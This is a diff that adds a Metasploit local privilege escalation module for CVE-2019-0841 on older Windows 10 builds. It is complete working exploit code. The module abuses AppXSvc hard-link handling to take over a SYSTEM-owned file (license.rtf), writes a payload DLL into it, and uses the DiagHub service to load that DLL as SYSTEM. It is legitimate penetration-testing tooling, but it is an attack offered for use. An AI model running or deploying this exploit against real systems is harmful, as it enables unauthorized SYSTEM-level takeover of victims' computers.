@@ -1,0 +1,128 @@
+##
+# This module requires Metasploit: https://metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
+##
+
+class MetasploitModule < Msf::Exploit::Local
+  Rank = NormalRanking
+
+  include Exploit::EXE
+  include Post::File
+  include Post::Windows::Priv
+  include Post::Windows::FileInfo
+  include Exploit::FileDropper
+
+  def initialize(info = {})
+    super(update_info(info,
+      'Name'           => 'AppXSvc Hard Link Privilege Escalation',
+      'Description'    => %q(
+        There exists a privilege escalation vulnerability for
+        Windows 10 builds prior to build 17763. Due to the AppXSvc's
+        improper handling of hard links, a user can gain full
+        privileges over a SYSTEM-owned file. The user can then utilize
+        the new file to execute code as SYSTEM.
+
+        This module employs a technique using the Diagnostics Hub Standard
+        Collector Service (DiagHub) which was discovered by James Forshaw to
+        load and execute a DLL as SYSTEM.
+      ),
+      'License'        => MSF_LICENSE,
+      'Author'         =>
+      [
+        'Nabeel Ahmed',      # Vulnerability discovery and PoC
+        'James Forshaw',     # Code creating hard links and communicating with DiagHub service
+        'Shelby Pace'        # Metasploit module
+      ],
+      'References'     =>
+        [
+          [ 'CVE', '2019-0841' ],
+          [ 'URL', 'https://krbtgt.pw/dacl-permissions-overwrite-privilege-escalation-cve-2019-0841/' ],
+          [ 'URL', 'https://googleprojectzero.blogspot.com/2015/12/between-rock-and-hard-link.html' ],
+          [ 'URL', 'https://googleprojectzero.blogspot.com/2018/04/windows-exploitation-tricks-exploiting.html' ],
+          [ 'URL', 'https://0x00-0x00.github.io/research/2019/05/30/Coding-a-reliable-CVE-2019-0841-Bypass.html' ]
+        ],
+      'Targets'        =>
+        [
+          [ 'Windows 10', { 'Platform' => 'win' } ]
+        ],
+      'DisclosureDate' => '2019-04-09',
+      'DefaultTarget'  => 0
+    ))
+  end
+
+  def check
+    return CheckCode::Unknown if sysinfo['OS'] !~ /windows\s10/i
+
+    path = expand_path('%WINDIR%\\system32\\win32k.sys')
+    major, minor, build, revision, brand = file_version(path)
+    return CheckCode::Appears if build < 17763
+
+    CheckCode::Detected
+  end
+
+  def upload_file(file_name, file_path)
+    contents = File.read(File.join(Msf::Config.data_directory, 'exploits', 'CVE-2019-0841', file_name))
+    write_file(file_path, contents)
+    register_file_for_cleanup(file_path)
+  rescue
+    fail_with(Failure::UnexpectedReply, 'Failed to write file contents to target')
+  end
+
+  def init_process
+    print_status("Attempting to launch Microsoft Edge minimized.")
+    cmd_exec("cmd.exe /c start /min microsoft-edge:", nil, 30)
+  end
+
+  def mk_hard_link(src, target, link_exe)
+    out = cmd_exec("cmd.exe /c #{link_exe} \"#{src}\" \"#{target}\"")
+
+    return (out && out.include?('Done'))
+  end
+
+  def write_payload
+    print_status('Writing the payload to disk')
+    code = generate_payload_dll
+    @original_data = read_file(@rtf_path)
+    write_file(@rtf_path, code)
+  end
+
+  def exploit
+    vuln_status = check
+    fail_with(Failure::NotVulnerable, 'Failed to detect Windows 10') if vuln_status == CheckCode::Unknown
+
+    fail_with(Failure::None, 'Already running with SYSTEM privileges') if is_system?
+    cmd_exec("taskkill /F /IM MicrosoftEdge.exe /FI \"STATUS eq RUNNING\"")
+    dat_path = expand_path("%USERPROFILE%\\AppData\\Local\\Packages\\Microsoft.MicrosoftEdge_8wekyb3d8bbwe\\Settings\\Settings.dat")
+    fail_with(Failure::NotFound, 'Path does not exist') unless exist?(dat_path)
+
+    if session.arch == ARCH_X86
+      exe_name = 'CVE-2019-0841_x86.exe'
+      f_name = 'diaghub_load_x86.exe'
+    elsif session.arch == ARCH_X64
+      exe_name = 'CVE-2019-0841_x64.exe'
+      f_name = 'diaghub_load_x64.exe'
+    end
+    link_file_name = expand_path("%TEMP%\\#{Rex::Text.rand_text_alpha(6...8)}.exe")
+    upload_file(exe_name, link_file_name)
+
+    @rtf_path = expand_path('%WINDIR%\\system32\\license.rtf')
+    fail_with(Failure::UnexpectedReply, 'Did not retrieve expected output') unless mk_hard_link(dat_path, @rtf_path, link_file_name)
+    print_good('Successfully created hard link')
+    init_process
+    cmd_exec("taskkill /F /IM MicrosoftEdge.exe")
+
+    write_payload
+    diaghub_path = expand_path("%TEMP%\\#{Rex::Text.rand_text_alpha(8..12)}")
+    upload_file(f_name, diaghub_path)
+    cmd = "\"#{diaghub_path}\" \"license.rtf\""
+    cmd_exec(cmd)
+  end
+
+  def cleanup
+    folder_path = expand_path("%TEMP%\\etw")
+    dir_rm(folder_path)
+
+    write_file(@rtf_path, @original_data)
+    super
+  end
+end
